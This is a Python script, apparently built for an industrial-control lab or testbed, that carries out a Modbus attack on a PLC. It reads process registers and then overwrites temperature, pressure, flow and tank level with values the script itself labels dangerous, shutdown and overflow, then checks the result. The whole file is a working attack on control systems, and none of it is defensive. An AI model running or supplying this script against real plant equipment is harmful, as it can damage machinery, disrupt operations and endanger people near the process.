#!/usr/bin/env python3
"""
ATTACK SIMULATION - Malicious Modbus Write Commands
"""

from pymodbus.client import ModbusTcpClient
import time
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

PLC_IP = "10.2.0.10"
PLC_PORT = 502

def attack_plc():
    log.info("="*60)
    log.info("ATTACK SIMULATION STARTED")
    log.info(f"Target: PLC at {PLC_IP}:{PLC_PORT}")
    log.info("="*60)
    
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    
    if not client.connect():
        log.error("Failed to connect to PLC")
        return
    
    log.info("[RECON] Connected to PLC successfully")
    time.sleep(1)
    
    # Phase 1: Reconnaissance
    log.info("\n[PHASE 1] Reconnaissance - Reading PLC registers...")
    result = client.read_holding_registers(address=0, count=4)
    if not result.isError():
        log.info(f"  Current Temperature: {result.registers[0]}F")
        log.info(f"  Current Pressure: {result.registers[1]} PSI")
        log.info(f"  Current Flow: {result.registers[2]} GPM")
        log.info(f"  Current Level: {result.registers[3]}%")
    time.sleep(1)
    
    # Phase 2: Attack
    log.info("\n[PHASE 2] ATTACK - Writing dangerous values...")
    
    log.info("  [ATTACK] Setting temperature to 500F (DANGEROUS)...")
    client.write_register(address=0, value=500)
    time.sleep(0.5)
    
    log.info("  [ATTACK] Setting pressure to 999 PSI (DANGEROUS)...")
    client.write_register(address=1, value=999)
    time.sleep(0.5)
    
    log.info("  [ATTACK] Setting flow rate to 0 GPM (SHUTDOWN)...")
    client.write_register(address=2, value=0)
    time.sleep(0.5)
    
    log.info("  [ATTACK] Setting tank level to 100% (OVERFLOW)...")
    client.write_register(address=3, value=100)
    time.sleep(1)
    
    # Phase 3: Verify
    log.info("\n[PHASE 3] Verifying attack impact...")
    result = client.read_holding_registers(address=0, count=4)
    if not result.isError():
        log.info(f"  Temperature now: {result.registers[0]}F")
        log.info(f"  Pressure now: {result.registers[1]} PSI")
        log.info(f"  Flow now: {result.registers[2]} GPM")
        log.info(f"  Level now: {result.registers[3]}%")
    
    log.info("\n" + "="*60)
    log.info("ATTACK SIMULATION COMPLETE")
    log.info("="*60)
    
    client.close()

if __name__ == "__main__":
    attack_plc()
EOF